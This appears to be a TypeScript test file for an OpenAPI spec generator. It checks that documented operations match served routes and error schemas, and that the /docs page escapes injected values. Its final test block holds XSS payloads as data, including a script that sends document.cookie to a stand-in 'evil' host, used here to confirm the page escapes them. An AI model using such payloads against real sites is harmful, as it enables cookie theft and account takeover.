// openapi-round-trip.test.ts
//
// `batteries-7`. A spec is a document and nothing ever executed it, so it
// drifted from the wire in four separate ways at once and every one of them
// read as correct (`FJS-902`). Measured against a service narrowed by
// `methods:`, six documented operations produced three 405s and one 404.
//
// The instrument is the round trip: **call every operation the spec documents,
// against the app that produced it**. Nothing narrower can catch a fifth kind
// of lie, because the assertions one writes are the ones one already thought
// of — a per-clause test would have passed on the `/{id}/{method}` path, which
// no assertion here was written to look for.
//
// Every refusal is paired (`FJS-351`): a narrowed verb absent beside an allowed
// one present, an injected value escaped beside a legitimate one still rendered.

import { describe, it, expect, beforeAll, afterAll } from 'bun:test'
import { createApp, createService, openapi, defaultConfig } from '../index.ts'

const PORT = 3944
const base = `http://localhost:${PORT}`

let app: ReturnType<typeof createApp>
let spec: Record<string, any>

beforeAll(async () => {
  app = createApp({
    config: { port: PORT, database: { url: '', log: false }, services: { dir: '/nonexistent' }, http: { ...defaultConfig.http } },
  })
  // Narrowed on purpose: create, patch and remove are NOT answered.
  app.services.register(createService({
    name: 'orders',
    methods: ['find', 'get', { method: 'pay', input: 'PayOrder' }],
    async find() { return [] },
    async get(ctx: any) { return { id: ctx.id } },
    async pay(ctx: any) { ctx.dispatch = false; return { paid: true } },
  }))
  // The pair: a service narrowed by nothing, whose full CRUD must survive.
  app.services.register(createService({
    name: 'notes',
    async find() { return [] },
    async get(ctx: any) { return { id: ctx.id } },
    async create() { return { id: 'n1' } },
    async patch() { return { id: 'n1' } },
    async remove() { return { id: 'n1' } },
  }))
  app.configure(openapi({ title: 'Probe', version: '1' }))
  await app.start()
  spec = await (await fetch(`${base}/openapi.json`)).json() as Record<string, any>
})

afterAll(async () => { await app?.stop() })

describe('every documented operation is one the wire answers', () => {

  it('calls each of them and none is a 404 or a 405', async () => {
    const results: Array<[string, number]> = []

    for (const [path, item] of Object.entries<any>(spec.paths)) {
      for (const verb of ['get', 'post', 'patch', 'put', 'delete']) {
        if (!item[verb]) continue
        const headers: Record<string, string> = { 'content-type': 'application/json' }
        // Honour a header parameter the spec itself declares — that is part of
        // what it documents.
        for (const p of [...(item.parameters ?? []), ...(item[verb].parameters ?? [])])
          if (p.in === 'header' && p.schema?.enum?.[0]) headers[p.name] = p.schema.enum[0]

        const res = await fetch(`${base}${path.replace('{id}', 'x1')}`, {
          method: verb.toUpperCase(),
          headers,
          body: verb === 'get' || verb === 'delete' ? undefined : '{}',
        })
        results.push([`${verb.toUpperCase()} ${path}`, res.status])
      }
    }

    // The document must not be empty, or this passes by describing nothing.
    expect(results.length).toBeGreaterThan(5)
    expect(results.filter(([, s]) => s === 404 || s === 405)).toEqual([])
  })
})

describe('what a service ANSWERS decides what is documented', () => {

  it('a verb narrowed away by `methods:` is not documented', () => {
    expect(spec.paths['/orders'].post).toBeUndefined()
    expect(spec.paths['/orders/{id}'].patch).toBeUndefined()
    expect(spec.paths['/orders/{id}'].delete).toBeUndefined()
  })

  it('the same verbs on an unnarrowed service still are', () => {
    // Without this, filtering everything would look identical to filtering
    // correctly.
    expect(spec.paths['/notes'].post).toBeDefined()
    expect(spec.paths['/notes/{id}'].patch).toBeDefined()
    expect(spec.paths['/notes/{id}'].delete).toBeDefined()
  })

  it('a path with no operations left is not emitted at all', async () => {
    const solo = createApp({ config: { port: PORT + 1, database: { url: '', log: false }, services: { dir: '/nonexistent' } } })
    solo.services.register(createService({ name: 'pings', methods: ['find'], async find() { return [] } }))
    solo.configure(openapi({ title: 'x', version: '1' }))
    await solo.start()
    const s = await (await fetch(`http://localhost:${PORT + 1}/openapi.json`)).json() as Record<string, any>
    await solo.stop()

    expect(s.paths['/pings']).toBeDefined()
    expect(s.paths['/pings/{id}']).toBeUndefined()
  })
})

describe('a custom method is documented at the address the wire serves', () => {

  it('is a POST on the resource path with the header, not a path of its own', () => {
    // The old shape, `/orders/{id}/pay`, was measured answering 404 — no such
    // route is registered; the wire dispatches on `X-Service-Method`.
    expect(spec.paths['/orders/{id}/pay']).toBeUndefined()

    const op = spec.paths['/orders/{id}'].post
    expect(op).toBeDefined()
    const header = op.parameters.find((p: any) => p.name === 'X-Service-Method')
    expect(header.required).toBe(true)
    expect(header.schema.enum).toEqual(['pay'])
  })

  it('names the methods in its description, since one operation now carries them all', () => {
    // OpenAPI dispatches on path and verb and cannot say *a different operation
    // per header VALUE*, so the list has to be readable somewhere.
    expect(spec.paths['/orders/{id}'].post.description).toContain('X-Service-Method')
    expect(spec.paths['/orders/{id}'].post.description).toContain('`pay`')
  })
})

describe('an error response carries a shape', () => {

  it('components.schemas is not empty and holds Error', () => {
    expect(Object.keys(spec.components.schemas)).toContain('Error')
    expect(spec.components.schemas.Error.required).toEqual(['name', 'message', 'code'])
  })

  it('every error response references it rather than carrying prose alone', () => {
    for (const code of ['401', '403', '404', '422']) {
      const res = spec.paths['/orders'].get.responses[code]
      expect(res.content['application/json'].schema.$ref).toBe('#/components/schemas/Error')
    }
  })

  it('the shape matches what the boundary actually sends', async () => {
    // Asked of a real refusal rather than of the document: a schema agreeing
    // only with itself is what this whole file exists to refuse.
    const res  = await fetch(`${base}/nosuchservice`)
    const body = await res.json() as Record<string, unknown>
    for (const key of spec.components.schemas.Error.required) expect(body).toHaveProperty(key)
  })
})

describe('a declared input reaches the spec', () => {

  it('names the type even when the seed cannot be resolved', () => {
    // This app has no Litestone client, so `PayOrder` resolves to no shape —
    // and the operation still says which type it wants rather than dropping it
    // in silence, which is what happened to every declared input before.
    const body = spec.paths['/orders/{id}'].post.requestBody.content['application/json'].schema
    const branch = body.oneOf[0]
    expect(branch.title).toBe('pay')
    expect(JSON.stringify(branch)).toContain('PayOrder')
  })
})

describe('the docs page interpolates two caller-supplied values', () => {

  let html: string

  beforeAll(async () => {
    const ui = createApp({ config: { port: PORT + 2, database: { url: '', log: false }, services: { dir: '/nonexistent' } } })
    ui.services.register(createService({ name: 'orders', methods: ['find'], async find() { return [] } }))
    ui.configure(openapi({
      title:   'Shop </title><script>alert(1)</script>',
      version: '1',
      ui:      true,
      scalar:  { customCss: '</script><script>fetch("//evil/"+document.cookie)</script>' },
    }))
    await ui.start()
    html = await (await fetch(`http://localhost:${PORT + 2}/docs`)).text()
    await ui.stop()
  })

  it('the page holds exactly the two scripts it wrote', () => {
    // A substring check on the injected text cannot see this: what matters is
    // how many elements the PARSER finds.
    expect((html.match(/<script/g) ?? []).length).toBe(2)
    expect(html).not.toContain('</script><script>fetch')
  })

  it('the title is escaped and still readable', () => {
    expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;')
    expect(html).toContain('Shop &lt;')            // the legitimate half survives
    expect(html).not.toContain('<title>Shop </title><script>')
  })

  it('the CDN reference is pinned to an exact version', () => {
    // Unpinned, the page runs whatever that package publishes today, on the
    // API's own origin.
    const src = html.match(/<script src="([^"]+)"/)?.[1] ?? ''
    expect(src).toMatch(/@scalar\/api-reference@\d+\.\d+\.\d+$/)
  })
})
